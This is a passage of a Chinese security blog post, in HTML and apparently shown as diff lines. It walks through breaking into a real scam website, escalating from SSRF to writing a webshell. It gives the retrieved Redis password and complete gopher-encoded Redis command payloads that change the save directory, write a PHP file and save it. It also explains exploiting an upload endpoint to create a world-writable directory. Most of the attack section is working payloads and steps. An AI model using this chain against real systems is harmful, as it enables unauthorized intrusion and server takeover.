class="variable">$userInfo</span>[<span class="string">&#x27;nickname&#x27;</span>]) ? <span class="variable">$userInfo</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="variable">$userInfo</span>[<span class="string">&#x27;nickname&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;avatar&#x27;</span> =&gt; <span class="keyword">empty</span>(<span class="variable">$userInfo</span>[<span class="string">&#x27;avatar&#x27;</span>]) ? <span class="string">&#x27;/up_files/room/avatar.png&#x27;</span> : <span class="variable">$userInfo</span>[<span class="string">&#x27;avatar&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;state&#x27;</span> =&gt; <span class="keyword">empty</span>(<span class="variable">$userInfo</span>[<span class="string">&#x27;password&#x27;</span>]) ?<span class="number">1</span>:<span class="number">2</span></span><br><span class="line">  );</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> $honor = get_honor_level($userId);</span></span><br><span class="line"><span class="comment"> if(($honor[&#x27;status1&#x27;] &amp;&amp; $honor[&#x27;status&#x27;]) || ($honor[&#x27;status&#x27;] &amp;&amp; $honor[&#x27;score&#x27;]==0))&#123;</span></span><br><span class="line"><span class="comment">  $data[&#x27;honor&#x27;] = $honor[&#x27;name&#x27;];</span></span><br><span class="line"><span class="comment">  $data[&#x27;icon&#x27;] = $honor[&#x27;icon&#x27;];</span></span><br><span class="line"><span class="comment">  $data[&#x27;num&#x27;] = $honor[&#x27;num&#x27;];</span></span><br><span class="line"><span class="comment"> &#125;else&#123;</span></span><br><span class="line"><span class="comment">  $data[&#x27;honor&#x27;] = 0;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//荣誉机制</span></span><br><span class="line"> <span class="variable">$data</span>[<span class="string">&#x27;honor&#x27;</span>] = get_honor_info(<span class="variable">$userId</span>);</span><br><span class="line"></span><br><span class="line"> log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_getHonor_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> ErrorCode::successResponse(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么现在就可以构造一个URL来读文件试一下是否可以成功<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/efe1bfa4-c495-4722-b48b-db7fbaf1736d.png" alt="efe1bfa4-c495-4722-b48b-db7fbaf1736d.png"><br>返回了图片路径就说明是读成功了的<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/5b81b44e-2da3-4b3c-a18d-f5f9a27bd570.png" alt="5b81b44e-2da3-4b3c-a18d-f5f9a27bd570.png"></p>
+<blockquote>
+<p>经过测试支持<code>file</code>、<code>http/s</code>、<code>dict</code>、<code>gopher</code>等协议</p>
+</blockquote>
+<h2 id="写shell失败"><a href="#写shell失败" class="headerlink" title="写shell失败"></a>写shell失败</h2><p>读文件并不是我的目标，最终的目的是要拿到权限<br>在之前在看配置文件的时候看到配置文件里面是配置了<code>Redis</code>密码的，但是并不清楚目标上是否开启，读到<code>/etc/passwd</code>之后看到有<code>redis</code>用户，那么八成是开启了的<br>这时候首先需要看一下目标机器上面的<code>Redis</code>是否配置了密码：<code>dict://127.0.0.1:6379/info</code><br>查看返回结果发现是配置了密码的<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/daf98084-0a93-43ff-a051-3b0b742b5b50.png" alt="daf98084-0a93-43ff-a051-3b0b742b5b50.png"><br>这时候有两个思路获取到<code>Redis</code>密码：</p>
+<ul>
+<li>爆破<code>Redis</code>密码：<code>dict://127.0.0.1:6379/auth:&lt;password&gt;</code></li>
+<li>找绝对路径读配置文件</li>
+</ul>
+<p>首选肯定是先找找看能否爆出来绝对路径，发现有两个文件有可能泄露绝对路径：</p>
+<ul>
+<li><code>/caches/log/object_error.php</code> （目标上不存在）</li>
+<li><code>/chat/workerman.log</code>：访问下载下来后，不出意外的泄露了绝对路径<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4a615c19-78d3-451c-a84b-14b5478809d3.png" alt="4a615c19-78d3-451c-a84b-14b5478809d3.png"><br>再通过<code>SSRF</code>读配置文件得到<code>Redis</code>的密码：<code>file:///www/wwwroot/webgz/caches/config.php</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/299328e6-eff4-4609-bbb0-7dbf3ce14957.png" alt="299328e6-eff4-4609-bbb0-7dbf3ce14957.png"><br>得到密码之后怎样在非交互模式下使用密码进行验证并且执行指令呢？可以在<code>Redis</code>官方文档中找到答案：<code>https://redis.io/topics/pipelining</code></li>
+<li>大概意思就是<code>Redis</code>支持非传统一次<code>request</code>等待一次<code>response</code>的模式，可以发送多条<code>request</code>后再一次性接收所有<code>response</code></li>
+</ul>
+<p>这个时候<code>dict</code>协议就不行了，因为<code>dict</code>协议会自动在结尾补上<code>\r\n</code>(<code>CRLF</code>)，不能一次发出多条指令，所以这里需要使用<code>gopher</code>协议</p>
+<blockquote>
+<p>把<code>Redis</code>命令转换为<code>gopher</code>协议：</p>
+</blockquote>
+<ul>
+<li>先使用<code>socat</code>转发流量并打印文本<code>socat -v tcp-listen:6378,fork tcp-connect:localhost:6379</code></li>
+<li>然后使用<code>redis-cli</code>攻击6378端口<code>redis-cli -h 127.0.0.1 -p 6378 -a qq123456 config get dir</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/702c41bf-326d-4cae-87c9-9c754d7a7a94.png" alt="702c41bf-326d-4cae-87c9-9c754d7a7a94.png"></li>
+</ul>
+<blockquote>
+<p>这时候是可以发现一些规律的（也就是RESP协议，可以百度了解）</p>
+</blockquote>
+<blockquote>
+<p>转换：</p>
+</blockquote>
+<ul>
+<li>如果第1个字符是<code>&gt;</code>或者<code>&lt;</code> 那么丢弃该行字符串，表示请求和返回的时间和流量详情。</li>
+<li>删除从<code>&lt;</code>开头的行到<code>&gt;</code>开头的行之间的行，因为这是返回的数据，这里不需要</li>
+<li>将<code>\r换行</code>字符串替换成<code>%0d%0a</code></li>
+<li>开头为<code>*</code>的数字为数组元素数量，开头为<code>$</code>的数字为字符数量，也就是说<code>*3</code>后面需要跟3个<code>$x</code></li>
+<li><code>Gopher</code>协议发送数据第一个字符会消失，所以用<code>_</code>来代替第一个字符（其他字符也都可以）</li>
+</ul>
+<p>那么这里需要认证的<code>config get dir</code>转换为<code>gopher</code>协议就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aget%0d%0a$3%0d%0adir%0d%0a</span><br></pre></td></tr></table></figure>
+<p>后面必须再加一个<code>quit</code>（<code>*1%0d%0a$4%0d%0aquit%0d%0a</code>），否则会一直连接，不退出，也就无法返回结果<br>发送前再把<code>_</code>后面的所有内容再<code>url</code>编码一次，发送并得到结果<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/de188928-46c4-403c-8459-33939109b689.jpg" alt="de188928-46c4-403c-8459-33939109b689.jpg"><br>现在就可以通过<code>Redis</code>往目标网站写一个<code>webshell</code>了</p>
+<ol>
+<li>首先需要关闭<code>RDB</code>压缩，<code>Redis</code>默认开启，如果不关闭，字符串可能会被压缩出现乱码导致<code>shell</code>不能正常运行：<code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$14%0d%0ardbcompression%0d%0a$2%0d%0ano%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4ad82c3b-ae67-4f98-a57d-86b06fcb3844.png" alt="4ad82c3b-ae67-4f98-a57d-86b06fcb3844.png"><br>回显<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/d24d6b05-0ee0-47b2-a04c-271da2f92442.png" alt="d24d6b05-0ee0-47b2-a04c-271da2f92442.png"></li>
+<li>设置保存位置：<code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$35%0d%0a/www/wwwroot/webgz/up_files/avatar/%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4263f1e3-9302-49a2-8ac4-d92d52952d06.png" alt="4263f1e3-9302-49a2-8ac4-d92d52952d06.png"><blockquote>
+<p>在设置保存路径之前，最好先获取一下原本的保存路径，写入<code>shell</code>之后恢复回去：<code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aget%0d%0a$3%0d%0adir%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></p>
+</blockquote>
+</li>
+<li>设置文件名：<code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$5%0d%0a1.php%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/eedf9265-be6c-4159-b6ec-678df695f24e.png" alt="eedf9265-be6c-4159-b6ec-678df695f24e.png"></li>
+<li>写入一个<code>key</code>，内容为<code>wenshell</code>：<code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0as%0d%0a$27%0d%0a%0a%0d%0a&lt;?php phpinfo();?&gt;%0d%0a%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4cb8b07e-bec8-48f4-9109-b111984556f7.png" alt="4cb8b07e-bec8-48f4-9109-b111984556f7.png"></li>
+<li>保存：<code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/b4f232d9-7cc2-476c-afa7-b0503c908bff.png" alt="b4f232d9-7cc2-476c-afa7-b0503c908bff.png"></li>
+</ol>
+<p>发现没有写进去，目标机器为<code>Linux</code>，猜测是权限的问题（可能网站路径都是<code>755</code>，而<code>redis</code>权限想写进去最后一位权限得是<code>7</code>(读写执行)、<code>6</code>(读写)、<code>2</code>(写)）<br>那么这个时候有几个选择：</p>
+<ul>
+<li>试一下定时任务有没有写权限（测试没权限）</li>
+<li>多找几个目录试试看有没有<code>777</code>权限目录（没找到）</li>
+<li>在源码里搜索一下是否有<code>chmod</code>、<code>mkdir</code>等方法赋予了<code>777</code>权限</li>
+<li><code>Fastcgi</code>（攻击方法参考<code>https://bbs.ichunqiu.com/thread-58455-1-1.html</code>），但是这里不知道是走的<code>socket</code>还是<code>TCP</code>（默认<code>socket</code>），所以没测试</li>
+</ul>
+<h1 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h1><ol>
+<li>找到一些<code>chmod</code>、<code>mkdir</code>要不就是不可控，要不就是目录已经存在<br>最后在<code>\core\class\upload.php</code>的<code>upload</code>方法里找到使用<code>chmod</code>方法会以当前日期新建一个目录并赋予<code>777</code>权限<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/2a29dbc9-2a1e-4e89-b1b5-94ffb5c455e5.png" alt="2a29dbc9-2a1e-4e89-b1b5-94ffb5c455e5.png"><br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/2137dc19-a71c-445b-94fc-4cfa1a8fa0ac.png" alt="2137dc19-a71c-445b-94fc-4cfa1a8fa0ac.png"></li>
+<li>搜索调用了<code>upload</code>类的并可控的点<br>在<code>\lib\controller\attachment\attachment.php</code>的公开方法<code>upload</code>里调用了<code>upload</code>类，并且可控<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/69580fe8-97af-4d1e-945e-28cb03f5251d.png" alt="69580fe8-97af-4d1e-945e-28cb03f5251d.png"></li>
+<li>构造上传<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/08e5c830-c06c-4225-91d5-5012bd597ce0.png" alt="08e5c830-c06c-4225-91d5-5012bd597ce0.png"><br>上传成功，返回了路径<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/9382fedd-cfee-418f-8409-0ec04f38323f.png" alt="9382fedd-cfee-418f-8409-0ec04f38323f.png"><br>成功访问到，那么这个新建的目录<code>up_files/avatar/2021/0315/</code>就是<code>777</code>权限，可以通过<code>redis</code>写入<code>webshell</code>了</li>
+<li>再用<code>redis</code>写<code>webshell</code>发现<code>&lt;</code>和<code>&gt;</code>被实体化了，那么把这两个都再进行一次<code>url</code>编码即可</li>
+<li></li>
+</ol>
+<ul>
+<li><code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$14%0d%0ardbcompression%0d%0a$2%0d%0ano%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></li>
+<li><code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$45%0d%0a/www/wwwroot/webgz/up_files/avatar/2021/0315/%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></li>
+<li><code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$5%0d%0a1.php%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></li>
+<li><code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0as%0d%0a$26%0d%0a%0a%0d%0a%3C?php phpinfo();?%3E%0d%0a%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></li>
+<li><code>*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></li>
+</ul>
+<ol start="6">
+<li>访问<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4fc0bcae-df90-4b1d-936f-9e2808097835.png" alt="4fc0bcae-df90-4b1d-936f-9e2808097835.png"><br>成功，把<code>redis</code>配置给他改回去都可以了</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>关注公众号可以订阅最新相关文章</div>
+
+  <!--<button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>-->
+
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/Public-WeChat.jpg" alt="行云 微信支付">
+
+        <!-- 注释掉这一行打赏提示 -->
+        <!-- <p>微信支付</p> -->
+        
+      </div>
+
+  </div>
+
+  <!-- 直接显示微信二维码 -->
+  <script>
+    var qr = document.getElementById('qr');
+    qr.style.display = 'block';
+  </script>
+
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/07/Bypass360-SelfStarting/" rel="prev" title="Bypass360 自启动">
+      <i class="fa fa-chevron-left"></i> Bypass360 自启动
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%B7%E5%9B%A0"><span class="nav-number">1.</span> <span class="nav-text">起因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">2.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99shell%E5%A4%B1%E8%B4%A5"><span class="nav-number">2.1.</span> <span class="nav-text">写shell失败</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4"><span class="nav-number">3.</span> <span class="nav-text">突破</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="行云"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">行云</p>
+  <div class="site-description" itemprop="description">千里江山 任我飞渡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xingyun-cloud" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xingyun-cloud" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="far fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">行云</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
